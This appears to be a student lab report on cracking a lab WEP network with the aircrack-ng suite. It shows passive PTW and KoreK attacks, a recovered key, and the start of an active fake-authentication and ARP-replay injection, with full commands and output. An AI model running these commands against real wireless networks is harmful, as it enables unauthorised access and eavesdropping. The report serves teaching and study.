# Question 1: Cracking WEP

## a) Setup

* Installing on nodes: `opkg install aircrack-ng`

## b) Pasive WEP attack using PTW

* `iw wlan0 scan` output:

```
	BSS 00:1b:b1:01:dc:b2(on wlan0)
		TSF: 375550100327 usec (4d, 08:19:10)
		freq: 2462
		beacon interval: 100 TUs
		capability: ESS (0x0431)
		signal: -73.00 dBm
		last seen: 200 ms ago
		Information elements from Probe Response frame:
		SSID: WirelessLab_WEP_Crack_Me
	BSS 00:1b:b1:02:01:4e(on wlan0)
		TSF: 137333337598 usec (1d, 14:08:53)
		freq: 2412
		beacon interval: 100 TUs
		capability: ESS (0x0431)
		signal: -41.00 dBm
		last seen: 4190 ms ago
		Information elements from Probe Response frame:
		SSID: WirelessLab_WPA_Crack_Me
```

##### Start nc on steppingStone, with starting time (epoch) in filename:

```
nc -l -p 8080 > "tcpdump_run01-$(date +%s).cap"
```

### PTW attack with `tcpudmp` on node6:

We used tcpdump on node6 to capture packets, because `airodump-ng` makes the files locally and we couldnt find a way to forward them to stepping stone, which was needed because of lack of space on nodes. We then used the `aircrack-ng` suite on our local machines, because it wasn't installed on SteppingStone.

#### First try:

###### Capture packets:

```
tcpdump -i wlan1 -G 10800 -W 1 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
```

Options:

* `-i wlan1` : Capture on interface wlan1
* `-G 10800` : Capture for 10800s (3 hours)
* `-W 1` : Write only one file (stop after we hit the -G limit
* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
* `-s 65535` : capture whole packets
* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP

##### Results:

* `capinfos -A tcpdump_run01-1483830885-filtered.cap` :

```
File name:           tcpdump_run01-1483830885-filtered.cap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  IEEE 802.11 plus radiotap radio header
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   2896 k
File size:           3373 MB
Data size:           3327 MB
Capture duration:    7875.773085 seconds
First packet time:   2017-01-08 00:14:47.512964
Last packet time:    2017-01-08 02:26:03.286049
Data byte rate:      422 kBps
Data bit rate:       3379 kbps
Average packet size: 1148,64 bytes
Average packet rate: 367 packets/s
SHA1:                e264de9430e678647886d41789b25acb47874038
RIPEMD160:           b9156d622cc7a4bf4e913924df0bd45f36ab8c70
MD5:                 31a428278626e3c398afb431b4333d7c
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Name = UNKNOWN
                     Description = NONE
                     Encapsulation = IEEE 802.11 plus radiotap radio header (23/127 - ieee-802-11-radiotap)
                     Speed = 0
                     Capture length = 65535
                     FCS length = -1
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Filter string = NONE
                     Operating system = UNKNOWN
                     Comment = NONE
                     BPF filter length = 0
                     Number of stat entries = 0
                     Number of packets = 2896715

```

* `aircrack-ng -z tcpdump_run01-1483830885-filtered.cap` :

```
Opening tcpdump_run01-1483830885-filtered.cap
Read 2896715 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1B:B1:01:DC:B2  WirelessLab_WEP_Crack_Me  WEP (1926031 IVs)

Choosing first network as target.

Opening tcpdump_run01-1483830885-filtered.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 1926031 ivs.

			Aircrack-ng 1.2 beta3


		[00:00:12] Tested 157873 keys (got 1926031 IVs)

   KB    depth   byte(vote)
    0  131/133   C1(1923328) 04(1922816) 0F(1922560) 8D(1922560) 2F(1922304) 5B(1922304) 7A(1922304) C5(1922304) FB(1922304) B1(1921792) 
    1   84/  1   D2(1935104) 95(1934848) 38(1934592) 4D(1934336) 5E(1934336) D9(1934336) 68(1934080) 04(1933824) F0(1933824) 7D(1933312) 
    2    2/ 13   3F(1984000) 2A(1983232) 4C(1968128) BC(1966848) 5D(1965056) 88(1961984) CE(1960704) 25(1958400) 9F(1958400) EA(1957888) 
    3  255/  3   DD(1868800) 46(1979136) D7(1975040) 45(1974272) 11(1973760) F4(1972992) D5(1970944) 07(1969920) 3E(1967616) AB(1965056) 
    4    0/  4   83(2614272) 0B(1974528) 1A(1973760) C5(1973504) 29(1969152) 5B(1967872) A1(1967360) A7(1967104) 84(1966080) 28(1963520) 

Failed. Next try with 1930000 IVs.
```

#### Second try:

###### Capture packets:

```
tcpdump -i wlan1 -c 300000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
```

Options:

* `-i wlan1` : Capture on interface wlan1
* `-c 300000` : stop after 300.000 captured packets
* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
* `-s 65535` : capture whole packets
* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP

##### Results:

* `capinfos -A tcpdump_run02-1483874801.cap` :

```
File name:           tcpdump_run02-1483874801.cap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  IEEE 802.11 plus radiotap radio header
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   300 k
File size:           350 MB
Data size:           345 MB
Capture duration:    794.134094 seconds
First packet time:   2017-01-08 12:26:42.462937
Last packet time:    2017-01-08 12:39:56.597031
Data byte rate:      434 kBps
Data bit rate:       3478 kbps
Average packet size: 1151,12 bytes
Average packet rate: 377 packets/s
SHA1:                e56ddd53b97500407114efcafa74eace4ea09003
RIPEMD160:           070327dc5ebc1c78b7766c2c60f6727484899a6c
MD5:                 1ab1d14d9d735d7a90a3054d1b0274d6
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Name = UNKNOWN
                     Description = NONE
                     Encapsulation = IEEE 802.11 plus radiotap radio header (23/127 - ieee-802-11-radiotap)
                     Speed = 0
                     Capture length = 65535
                     FCS length = -1
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Filter string = NONE
                     Operating system = UNKNOWN
                     Comment = NONE
                     BPF filter length = 0
                     Number of stat entries = 0
                     Number of packets = 300000

```

* `aircrack-ng -z tcpdump_run02-1483874801.cap` :

```
Opening tcpdump_run02-1483874801.cap
Read 300000 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1B:B1:01:DC:B2  WirelessLab_WEP_Crack_Me  WEP (197335 IVs)

Choosing first network as target.

Opening tcpdump_run02-1483874801.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 197335 ivs.


			Aircrack-ng 1.2 beta3


		[00:00:02] Tested 161377 keys (got 197335 IVs)

   KB    depth   byte(vote)
    0   67/ 70   FE(200960) 5D(200704) 81(200704) FB(200704) 42(200448) 7A(200448) 87(200448) E6(200448) EB(200448) 29(200192) 
    1   35/  1   89(205568) 50(205312) E4(205312) 80(205056) CA(205056) 23(204800) 56(204800) 2B(204544) F9(204544) B5(204288) 
    2   12/ 48   A2(209664) 34(209152) 72(209152) 17(208640) 9A(208640) 5B(208384) D8(208384) 4B(208128) 93(208128) 36(207872) 
    3  255/  3   A9(178176) 99(211712) 5A(210688) 14(210432) 33(210432) D3(209664) 05(209408) B6(209408) CE(209152) 3F(208896) 
    4    0/  2   83(269824) 7F(216064) 74(213248) B6(212736) F7(212480) E7(211456) 63(210688) 39(210432) EC(210432) 28(210176) 

Failed. Next try with 200000 IVs.

```

#### Third try:

###### Capture packets:

```
tcpdump -i wlan1 -c 3000000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
```

Options:

* `-i wlan1` : Capture on interface wlan1
* `-c 3000000` : stop after 3.000.000 captured packets
* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
* `-s 65535` : capture whole packets
* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC (`ether`) of AP

##### Results:

* `capinfos -A tcpdump_run03-1483877361.cap` :

```
File name:           tcpdump_run03-1483877361.cap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  IEEE 802.11 plus radiotap radio header
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   751 k
File size:           878 MB
Data size:           866 MB
Capture duration:    2009.366120 seconds
First packet time:   2017-01-08 13:09:22.551034
Last packet time:    2017-01-08 13:42:51.917154
Data byte rate:      431 kBps
Data bit rate:       3450 kbps
Average packet size: 1153,15 bytes
Average packet rate: 374 packets/s
SHA1:                7ca87dc0e53f0eb8a512b48848a04b0fde48031b
RIPEMD160:           01406ffc68f230409375fe47409fe32d128c41a7
MD5:                 4a898572b44b5caf994e247d02da758c
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Name = UNKNOWN
                     Description = NONE
                     Encapsulation = IEEE 802.11 plus radiotap radio header (23/127 - ieee-802-11-radiotap)
                     Speed = 0
                     Capture length = 65535
                     FCS length = -1
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Filter string = NONE
                     Operating system = UNKNOWN
                     Comment = NONE
                     BPF filter length = 0
                     Number of stat entries = 0
                     Number of packets = 751550
```

* `aircrack-ng -z tcpdump_run03-1483877361.cap ` :

```
Opening tcpdump_run03-1483877361.cap
Read 751550 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1B:B1:01:DC:B2  WirelessLab_WEP_Crack_Me  WEP (501793 IVs)

Choosing first network as target.

Opening tcpdump_run03-1483877361.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 501793 ivs.

			Aircrack-ng 1.2 beta3


		[00:00:04] Tested 144965 keys (got 501793 IVs)

   KB    depth   byte(vote)
    0  194/197   F0(494592) 02(493824) 5F(493824) 37(493568) 6D(493568) FB(493568) B2(493312) B5(493312) F7(493312) 01(493056) 
    1    0/  1   47(682240) 96(527104) 80(526592) 2E(525312) B6(522496) DF(522240) 4D(521984) 5A(521472) 38(521216) 8C(521216) 
    2   10/  2   F7(520960) 1C(520448) 11(520192) CD(520192) A8(519424) DF(519168) 14(518912) E0(518912) 06(518656) 08(518656) 
    3  255/  3   9B(472320) 21(524800) 37(524800) 3B(524544) 14(524288) E8(524288) 06(523776) 5D(522496) 61(522496) 12(521472) 
    4   15/ 17   21(518656) 9C(517888) A8(517888) 11(517632) 5A(517632) B7(517376) 4F(516864) F6(516864) 4C(516608) 4D(516352) 

Failed. Next try with 505000 IVs.
```

* Just for fun, we tried also the Korek attack on this file:  `aircrack-ng -K tcpdump_run03-1483877361.cap` :

```
			Aircrack-ng 1.2 beta3


		[00:00:01] Tested 85 keys (got 501793 IVs)

   KB    depth   byte(vote)
    0    0/  2   4D(  41) 98(  24) 60(  15) 79(  15) 46(  12) 99(  12) C6(  12) F0(  12) 6B(  10) 58(   8) 
    1    0/  2   59(  82) DD(  52) 9D(  36) DC(  28) 18(  25) A4(  21) 1B(  19) 5A(  18) 1A(  16) 6E(  16) 
    2    0/  2   41(  49) 07(  26) 42(  24) 7E(  20) 40(  17) 93(  17) E6(  17) 44(  16) 62(  15) E7(  15) 
    3    0/  1   57(  67) 05(  25) 63(  12) 74(  12) 7F(  12) F6(  12) 72(  11) 73(  10) 9F(  10) 82(   9) 
    4    0/  1   45( 178) 71(  30) A1(  25) A7(  22) 54(  20) 62(  19) 04(  15) DA(  15) F7(  15) 18(  14) 
    5    0/  1   53(  65) 18(  26) AA(  21) CA(  17) 78(  16) 16(  14) 15(  13) 25(  12) 3E(  12) 51(  12) 
    6    0/  2   4F( 634) 98( 340) 9A( 125) 06(  71) A7(  65) B9(  60) EC(  58) 1B(  57) 2F(  57) 5C(  56) 
    7    0/  3   4D(  46) 60(  31) 09(  23) 3F(  20) 9C(  20) 13(  19) 15(  17) 16(  15) BB(  15) 04(  13) 
    8    1/  2   E4(  31) BB(  28) 51(  25) 09(  23) 08(  18) 5C(  18) 98(  16) 41(  15) CA(  15) B1(  14) 
    9    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0) 09(   0) 0A(   0) 
   10    1/  1   D2( 119) 04(  95) 8C(  86) 82(  84) FE(  76) 36(  72) E7(  71) EB(  70) 0F(  68) 32(  68) 

     KEY FOUND! [ 4D:59:41:57:45:53:4F:4D:45:50:41:53:53 ] (ASCII: MYAWESOMEPASS )
	Decrypted correctly: 100%
```

After this, we used this key to decrypt the catpured data from first run (3hr capture time) to check whether there are ARP packets, needed for PTW attack. There were indeed ARP packets captured. Since the first run captured almost 3 million packets. second 300.000 packets and third 750.000 packets on the ESSID WirelessLab_WEP_Crack_Me, and all the papers state that PTW attack needs less than 100.000 packets to have a success rate of more than 95%, we conclude that we are unable to crack this WEP password using PTW attack, but we are unsure of the reasons for this. Korek method on the other hand worked on third and first pass (as stated, KoreK needs at least 700.000 packets for 50% success rate), whereas the second capture was unsuccessfull, probably because of too low packet count.


## c) Active WEP attack using KoreK

#### 0. Get our ath9k (monitor) interface MAC address:

`ifconfig wlan1` output:
 
```
wlan1
Link encap:UNSPEC  HWaddr A8-54-B2-71-D3-5D-D0-CA-00-00-00-00-00-00-00-00
	UP BROADCAST NOTRAILERS RUNNING PROMISC ALLMULTI  MTU:1500  Metric:1
	RX packets:44435804 errors:0 dropped:0 overruns:0 frame:0
	TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
	collisions:0 txqueuelen:1000 
	bytes:26702657381 (24.8 GiB)  TX bytes:0 (0.0 B)
```

From which we get `A8-54-B2-71-D3-5D-D0`, or better `A8:54:B2:71:D3:5D` as our card MAC address.

#### 1. Injection test: 

`aireplay-ng -9 -e WirelessLab_WEP_Crack_Me -a 00:1b:b1:01:dc:b2 wlan1`

Options:

* `-9` : mean injection test
* `-e WirelessLab_WEP_Crack_Me` : is the wireless network ESSID name
* `-a 00:1b:b1:01:dc:b2` : is the access point MAC address
* `wlan1` is the interface name

Output:

```
13:50:38  Waiting for beacon frame (BSSID: 00:1B:B1:01:DC:B2) on channel 11
13:50:38  Trying broadcast probe requests...
13:50:38  Injection is working!
13:50:40  Found 1 AP 

13:50:40  Trying directed probe requests...
13:50:40  00:1B:B1:01:DC:B2 - channel: 11 - 'WirelessLab_WEP_Crack_Me'
13:50:47  Ping (min/avg/max): 7.349ms/7.349ms/7.349ms Power: -45.00
13:50:47   1/30:   3%
```

#### 4. Start nc on SteppingStone

`nc -l -p 8080 > "tcpdump_active_run01-$(date +%s).cap"`

#### 3. start tcpdump on node6:

`tcpdump -i wlan1 -c 1000000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &`

This has same options as above, with exception, that it will capture for 1.000.000 packets

#### 4. Use aireplay-ng to do a fake authentication with the access point

`aireplay-ng --fakeauth 0 -e WirelessLab_WEP_Crack_Me -a 00:1b:b1:01:dc:b2 -h A8:54:B2:71:D3:5D  wlan1`

Options:

* `--fakeauth 0` : fake authentication with AP, delay of 0 seconds
* `-e WirelessLab_WEP_Crack_Me` : is the wireless network ESSID name
* `-h A8:54:B2:71:D3:5D` : is our card MAC address
* `wlan1` is the interface name

Output:

```
14:19:46  Waiting for beacon frame (BSSID: 00:1B:B1:01:DC:B2) on channel 11

14:19:46  Sending Authentication Request (Open System) [ACK]
14:19:46  Authentication successful
14:19:46  Sending Association Request [ACK]
14:19:46  Association successful :-) (AID: 1)
```

#### 5. Start aireplay-ng in ARP request replay mode

`aireplay-ng --arpreplay -b 00:1b:b1:01:dc:b2 -h A8:54:B2:71:D3:5D wlan1`

* `--arpreplay` : standard ARP-request replay (ARP injection of received ARP request packets)
* `-e WirelessLab_WEP_Crack_Me` : is the wireless network ESSID name
* `-h A8:54:B2:71:D3:5D` : is our card MAC address
* `wlan1` is the interface name